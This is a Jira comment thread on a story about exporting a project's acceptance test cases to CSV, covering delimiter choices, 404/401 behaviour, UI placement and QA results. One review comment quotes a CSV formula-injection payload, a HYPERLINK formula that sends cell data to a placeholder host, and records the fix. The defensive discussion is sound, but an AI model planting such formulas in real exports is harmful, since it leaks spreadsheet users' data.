# Comments for BK-315

[View in Jira](https://jira.upexgalaxy.com/browse/BK-315)

---

### Alfonso Hernandez - 17/8/2026, 00:26:29

## Acceptance Test Plan (ATP) — Shift-Left DRAFT ready for review

The ATP DRAFT lives in the Acceptance Test Plan (ATP) field.

Action Required: review ambiguities, answer critical questions, confirm edge-case behavior, validate parametrization.
Refined on: 2026-08-16 — QA Shift-Left batch session
Local working copy: .context/PBI/epics/EPIC-BK-13-atc-library-acceptance-test-cases/stories/STORY-BK-315-tms-atc-library-export-a-project-s-atcs-to-csv/shift-left-refinement.md

---

### Alfonso Hernandez - 17/8/2026, 00:40:47

## PO Answers — Critical Questions ([https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315](https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315))

Answered from the Product Owner perspective, 2026-08-16.

### Q1: Tag-join delimiter

***Decision***: Use `"; "` (semicolon-space) to join multiple tags into the Tags CSV cell.
***Rationale***: The export's whole purpose is a reviewable snapshot for auditors and stakeholders outside Bunkai — people opening this in Excel/Sheets, not developers reading raw CSV. A comma delimiter would silently force every multi-tag ATC's Tags cell into quoted form for a reason that has nothing to do with the tag content itself, which is confusing to a non-technical reviewer inspecting the file. Semicolon-space is the de facto standard for multi-value CSV cells and keeps the "quoted = contains a special character in the actual data" signal clean.
***AC impact***: `business-rules.md` "Tags" row gets the explicit delimiter added: "joined with {{; }} (semicolon-space)". Scenario 1.4 in the refinement drops its "NEEDS PO/DEV CONFIRMATION" flag — delimiter is now {{; }} as originally inferred.

### Q2: Tag content charset (comma/quote/line-break allowed?)

***Decision***: No new restriction. Tags keep their existing free-text nature (already unconstrained at the DB level — `atcs.tags` has no CHECK constraint, unlike `layer`/`status`), and the export escapes Tag content with the exact same RFC4180 rule as Title.
***Rationale***: Tags already exist in production as free text used for full-text/tag search across the workspace's ATC library (`tsv` search column indexes title + tags together) — introducing a charset restriction now would be a breaking behavior change for existing tag data across every workspace, entirely out of scope for a 1-point export story. It's simpler and lower-risk to make the export correctly handle whatever tag content already exists than to retroactively police tag content because of a CSV export requirement.
***AC impact***: Scenario 4.5 (tag-own-text escaping) and Scenario 4.4 (Title × Tags decision-table interaction) are confirmed IN SCOPE, both drop their "NEEDS PO/DEV CONFIRMATION" flag. `business-rules.md` "Escaping" row is clarified to explicitly cover the Tags cell, not just Title.

### Q3: ATC library export size ceiling

***Decision***: No hard cap for this MVP. AC5's "several hundred ATCs, no row missing or truncated" stands as-is — export must complete correctly regardless of library size, best-effort, no formal SLA. Revisit with a real ceiling only if usage data later shows libraries growing into the tens of thousands.
***Rationale***: This is explicitly the first export capability at the ATC-library level (per the Story's own Context), and the out-of-scope list already excludes scheduled/recurring exports and cross-project export — the intended usage is an occasional, human-triggered, single-Project pull for an audit, not a high-frequency or bulk operation. Committing to an artificial ceiling (e.g. 5,000) this early would just create a new, unrequested support ticket the day a growing workspace's library crosses it, for a problem we have no evidence exists yet. Dev owns the implementation approach (buffered vs. streamed) to make "no cap" safe.
***AC impact***: Scenario 5.2 (very-large-library behavior) drops its "NEEDS PO/DEV CONFIRMATION" flag with the answer "must succeed, no formal ceiling." Scenario 5.3 (slow-generation handling) stays open as a Dev-owned NFR — no performance budget is being set by PO; Dev's best-effort answer on Technical Question #4 governs what "reasonable" means operationally.

---

### Alfonso Hernandez - 17/8/2026, 00:41:58

## Dev Answers — Technical Questions ([https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315](https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315))

Answered from the Developer perspective, 2026-08-16. Grounded against `upex-bunkai-tms` (product repo).

### Q1: Reuse non-disclosure 404 convention?

***Answer***: Yes — follow the identical `P0002` → `404` + {{```}} shape used by every sibling project-scoped reporting endpoint. Either import `mapCoverageRpcError` directly (the error shape is already generic — "Project not found" is not coverage-specific) or add a one-line domain mapper in a new `lib/atcs/export-errors.ts` that delegates to the same pattern, matching the precedent set by `lib/metrics/errors.ts` and `lib/traceability/errors.ts` (each domain gets its own thin mapper over the same shape).

***Evidence***: `lib/coverage/errors.ts` (`mapCoverageRpcError`, single `P0002` case → `ApiError('not*found', 'Project not found.', { details: { reason: 'not*found' } })`). Six call sites already share this exact convention: `app/api/v1/projects/[id]/coverage/route.ts`, `.../runs/report/route.ts`, `.../bugs/route.ts`, `.../bugs/heatmap/route.ts`, `app/api/v1/modules/[id]/route.ts`, `app/api/v1/imports/route.ts`. The `coverage` route's own comment states the underlying RPC collapses missing/foreign-workspace/non-member into the SAME 404, never a 403 — this is a deliberate, repeated architectural choice, not incidental.

### Q2: Status for fully unauthenticated request

***Answer****: `401` is already structurally guaranteed — no new code needed. A new export route built with the standard `withApiHandler(handler, { auth: 'required' })` wrapper (the default for every non-public route) automatically gets this: `resolveIdentity()` throws `ApiError('unauthorized', ...)` when there is no Bearer token and no cookie session, and `unauthorized` maps to HTTP `401` in the shared status table. This is fully distinct from the `404` non-disclosure path (Q1), which only fires for an **authenticated* caller hitting an inaccessible/nonexistent Project.

***Evidence***: `lib/api/principal.ts:63` — `resolveIdentity()`, cookie branch: `if (!user) throw new ApiError('unauthorized', 'Authentication required.')`. `lib/api/error-envelope.ts` `DEFAULT_STATUS.unauthorized = 401`. `lib/api/handler.ts` — `withApiHandler` calls `resolveIdentity(request)` before the handler body runs whenever `options.auth !== 'public'`, so this is enforced by the shared wrapper, not per-route logic that could be forgotten.

### Q3: Export trigger locked during generation?

***Answer****: Yes — disable the "Export as CSV" button while the request is in flight (`disabled={loading`}), matching the established action-trigger pattern in this codebase. This is different from filter **inputs*, which this same codebase deliberately leaves enabled during a fetch (superseding the in-flight request instead of blocking); a CSV export button is a one-shot action-trigger, not a filter input, so the disable-while-loading pattern applies.

***Evidence***: `components/runs/ProjectRunsReportView.tsx:495` (`disabled={loading`} on the report retry action) and `:563` (`disabled={loading || loadingOlder`} on the load-more action). Contrast with the explicit comment at `:334-336` — filters are "Deliberately NEVER disabled" because `startRequest()` supersedes an in-flight query; that rationale does not apply to a single-shot export trigger (there is no meaningful "supersede" semantics for a file download).

### Q4: Performance/timeout budget for large exports

***Answer****: ****NO PRECEDENT FOUND — proposed convention.*** No CSV/file-download/streaming code exists anywhere in the repo today (`Content-Disposition`, `text/csv`, `ReadableStream` all return zero hits). The closest architectural signal is `runs/report`, the codebase's other "potentially large Project-scoped dataset" endpoint — it does NOT return a full unbounded dump; it caps `?limit=<1..50>` and requires keyset cursor pagination for anything beyond that. That is the strongest available precedent against a single-shot unbounded CSV response.

Proposed convention for [https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315](https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315) (needs PO sign-off, since it also answers the PO's "unbounded export?" question): a ***hard row cap*** on the synchronous single-request export (suggest 5,000–10,000 ATCs) beyond which the endpoint returns a `422`-style `export*too*large` error rather than attempting the dump — cheaper to build than true streaming, and consistent with the codebase's general aversion to unbounded single-response payloads. Informal budget: best-effort, target p95 < 3s for a library up to 1,000 ATCs (in line with Vercel serverless function execution limits, which the rest of this app already runs under). If PO confirms exports must support truly unbounded libraries, escalate to a `ReadableStream`-based response instead of the row cap — genuinely new infrastructure for this codebase, size accordingly during estimation.

---

### Ely - 27/8/2026, 03:50:59

1. 

Mockup gate closed per the story's own note (master-design-plan.md §4.9/§8): `atc-library-global.html` draws no export affordance and is workspace-scoped, this story is project-scoped, so the mockup cannot be copied.

****Candidates scored**** (product value / consistency with live UI + frozen §2 tokens / implementation cost / reversibility / risk):

1. Topbar action, visible only on the project index route (`/projects/{slug}`), reusing the existing `New ATC`/`New Test` button-slot pattern in `project-shell.tsx`. High value (reachable from every browse mode: Tree/Table/Mind map), high consistency (reuses `buttonVariants`, the file's existing conditional-render precedent), low cost, fully reversible, low risk. ****WINNER.****
2. Toolbar button inside `AtcTable` only. Medium value (invisible in Tree/Mind map, where most users land by default), medium consistency, low cost.
3. ProjectExplorer rail context action. Low value (buried; contradicts the Dev Q3 ruling that this is a one-shot action trigger, not a navigation affordance).
4. New standalone `/projects/{slug}/export` route. Low value (extra navigation for a one-shot action), high cost, no precedent for a page-per-action in this codebase.

****Decision: Option 1.**** `ExportAtcsButton` client component in the Topbar's right slot, gated on `pathname === projectIndexHref` — mirrors the existing `isDetail`/`sectionLabel` conditionals already in that file. No new screen, no new route for the UI shell.

Recorded in `.context/design/master-design-plan.md` §4.9 (spec paragraph), §5 (new row D36, no ADR — presentational only, fails ADR gate 1 same as D32-D35), §8 ([https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315](https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315) row updated from unratified-🔒 to ratified).

---

### Ely - 27/8/2026, 03:51:14

1. 

****Endpoint shape.**** BK-50's evidence-chain export is 100% client-side (no server route) because its ACs never require a testable 401/404 API contract. BK-315's ACs (3.1-3.4) DO assert a JSON error-envelope 404 (non-disclosure across missing/foreign-workspace/removed-member) and a 401 for a fully unauthenticated request, at the API layer — that can only be satisfied by a real endpoint, not a Next.js page-level `notFound()`. Building `GET /api/v1/projects/{id}/atcs/export`, mirroring the `coverage`/`runs/report`/`bugs/heatmap` suffix convention for project-scoped reports, `withApiHandler(handler, { auth: 'required', requires: ['atc:read'] })`.

****No RPC, no migration**** (per the story's own constraint). ADR-0001's Path B (`principal.db`, RLS-scoped impersonating client for both cookie and PAT callers) is the current architecture per the ADR's 2026-08-24 implementation-status addendum, and is already used without an RPC in `modules/[id]/route.ts` DELETE's `assertActiveModule`. Reusing that shape: read `projects` by id via `db` (RLS-scoped) — `null` result is the non-disclosure 404, resolved in TS instead of a P0002 RPC mapping; then read `modules` + `atcs` the same way. 401 for a fully unauthenticated caller is free — the auth gateway throws before the handler runs, same guarantee every other `auth: 'required'` route already gets.

****Row cap — resolves the open Dev-Q4/PO-Q3 tension.***** The PO's ruling (comment posted 2026-08-17 00:40, 'No hard cap for this MVP... Dev owns the implementation approach to make no cap safe') is the binding product decision and predates the Dev comment (00:41, same session) that proposed a hard cap 'needs PO sign-off' — that proposal was never actually blessed and is superseded here. Decision: *****buffered single-response CSV, no row cap.**** Scored against a hard-cap 422 (contradicts the PO ruling outright) and true `ReadableStream` streaming (a new infrastructure class for a 1-point, occasional, human-triggered pull with zero streaming precedent anywhere in this repo) — buffered wins on product value and cost, and loses nothing on risk given the PO's own framing ('occasional audit pull, not bulk/high-frequency'). Revisit only if usage data later shows libraries growing large enough to matter, same as the PO's own re-open condition.

****CSV shape.**** ATC ID = raw `atcs.id` UUID — this codebase has an explicit, repeated ruling (master-design-plan.md §5 D32) against inventing human-readable code sequences for entities that don't have one; reusing that precedent rather than re-litigating it for this story. Tags join with '; ' (PO Q1) THEN the joined string runs through the same generic RFC4180 escape as every other column — this makes AC 4.4/4.5 (tag's own text has a comma/quote) fall out for free instead of needing special-casing.

---

### Ely - 27/8/2026, 12:57:17

1. 

Conductor review of PR #207 flagged (MAJOR): `csvEscapeField` did RFC4180 quoting only, so a cell whose content begins with `=`, `+`, `-`, `@`, tab or CR passes through untouched. ATC `title`/`tags` are member-writable free text, and this export exists specifically to be opened in a spreadsheet — a title like `=HYPERLINK(\"[https://evil.example/?d=\](https://evil.example/?d=)"&A1,\"Open\")` executes as a formula when an auditor opens the file in Excel/Sheets, exfiltrating adjacent cell content. RFC4180 quoting does not neutralize this: Excel evaluates the cell content AFTER unquoting.

****Options scored**** (blocks the exploit / preserves legitimate ATC titles-tags / implementation cost / reversibility):

1. ****Prefix-quote*****: if a cell's first character is in `=+-@`\t\r`, prepend `'` before the existing RFC4180 escape (OWASP CSV-injection guidance). Blocks the exploit completely (Excel/Sheets treat a leading `'` as a literal-text marker, formula never evaluates). Zero restriction on legitimate content — an ATC titled e.g. `-1 offset bug` or tagged `@mobile` still exports, just visibly prefixed. Cost: one small pure function + a unit test per trigger character. Fully reversible. *****WINNER.****
2. ****Reject at write time****: forbid `=+-@` (and tab/CR) as a LEADING character in ATC Title/Tags at create/update. Also blocks the exploit, but restricts legitimate content people already write today (the exact leading-hyphen/at-mention titles above), requires a new validation rule shared across every ATC write path (POST/PATCH `/api/v1/atcs`, the web editor's `saveAtcAction`), and is a scope expansion the story never asked for — this is a CSV-export story, not an ATC-authoring-rules story.
3. ****Do nothing****: leave RFC4180 quoting as the only defense. Rejected outright — this is the exact gap the MAJOR finding names; leaving it open is not a real option.

****Decision: Option 1.**** Implemented in `lib/atcs/csv-export.ts`'s `csvEscapeField` — the leading-character check runs before the existing RFC4180 quote/escape logic, applied generically to all 7 columns (same reasoning as the escaping rule itself: any user-writable free text is a vector, not just Title). One unit test per trigger character (`=`, `+`, `-`, `@`, tab, CR) plus a combined-with-existing-escaping case. Tradeoff recorded inline in `lib/atcs/csv-export.ts` and in `master-design-plan.md` §5 D36: the exported cell value for an affected ATC now differs by one leading character from the stored title/tag — a deliberate, visible security marker, not data loss (the underlying record is untouched).

---

### Automation for Jira - 27/8/2026, 15:58:36

✅ Pull Request is successfully MERGED and DEPLOYED on QA. 
It's Ready for Testing Phase! 
Dev Task is Done.

---

### Alfonso Hernandez - 31/8/2026, 01:42:08

## QA Testing Complete — [https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315](https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315)

***Environment***: Staging
***Result***: PASSED (20/24 TCs executed and PASSED; 4/24 Not Executed — test-infra/environment limitation, non-blocking; 0/24 FAILED)

### Test data used

- Project ***BK315 Core Export QA*** — 12 ATCs
- Project ***BK315 Special Chars QA*** — 14 ATCs (escaping + injection coverage)
- Project ***BK315 Large Library QA*** — 60 ATCs (scaled down from the AC's 500, time-boxed)
- Reused 1-ATC / 0-ATC / foreign-workspace / nonexistent-ID projects for 404/401 coverage

### Verified behaviors

- Fixed 7-column export shape/order — VERIFIED (TC1, TC3)
- RFC4180 escaping (comma / quote / linebreak, standalone and combined) — VERIFIED (TC13-18)
- Tag joining ({{; }} delimiter) — VERIFIED (TC4)
- Empty / 1-ATC / representative-large libraries — VERIFIED (TC2, TC6, TC7, TC19)
- 401 unauthenticated + 404 non-disclosure across the three denial causes — VERIFIED (TC8, TC9, TC11, TC12)
- Repeated Export trigger, no duplicate/stuck downloads — VERIFIED (TC22)
- ***CSV formula-injection security fix*** (all 6 trigger characters, standalone and combined with RFC4180) — VERIFIED (TC23, TC24)

### Issues noted (non-blocking)

- 4/24 Tests (TC5, TC10, TC20, TC21) could not be executed this session due to test-data/environment limitations — documented reasons recorded on each Xray Test Run, not product failures. Full detail in the ATR ([https://jira.upexgalaxy.com/browse/BK-788#icft=BK-788](https://jira.upexgalaxy.com/browse/BK-788#icft=BK-788)).
- Test-beyond-AC finding: `atcs.status` is permanently `'unrun'` system-wide — no code path writes it. Not a [https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315](https://jira.upexgalaxy.com/browse/BK-315#icft=BK-315) defect: the export correctly passes through whatever status value exists. Filed as [BK-789: ATC status field (atcs.status) is never written by any code path — permanently 'unrun'](https://jira.upexgalaxy.com/browse/BK-789).
- Process note: this project's Xray Test Run status scheme has no `BLOCKED`/`ABORTED` status — flagged for a project Xray admin (documented in the ATR, not fixable via CLI this session).

Artifacts: ATP-BK-787, ATS-BK-786, ATR-BK-788

---


_Synced from Jira by sync-jira-issues_
